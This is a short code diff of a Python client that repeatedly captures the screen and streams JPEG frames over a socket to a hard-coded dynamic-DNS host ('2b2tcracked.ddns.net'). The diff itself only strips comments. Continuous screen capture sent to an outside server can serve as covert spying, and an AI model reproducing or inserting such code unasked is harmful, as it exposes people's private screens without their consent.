@@ -16,27 +16,23 @@ def capture_screen():
 def send_screenshot(client_socket):
     while True:
         try:
-            # Capture the screen
+
             frame = capture_screen()
 
-            # Encode the frame as JPEG
             _, img_encoded = cv2.imencode('.jpg', frame)
             data = img_encoded.tobytes()
 
-            # Send the size of the data first
             client_socket.sendall(struct.pack("L", len(data)))
 
-            # Send the actual data
             client_socket.sendall(data)
-            
-            # Wait a bit before sending the next frame
+
             time.sleep(0.1)
         except Exception as e:
             print(f"Error sending screenshot: {e}")
             break
 
 def main():
-    SERVER_IP = '2b2tcracked.ddns.net'  # Replace with the server's IP address
+    SERVER_IP = '2b2tcracked.ddns.net'  
     SERVER_PORT = 6700
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
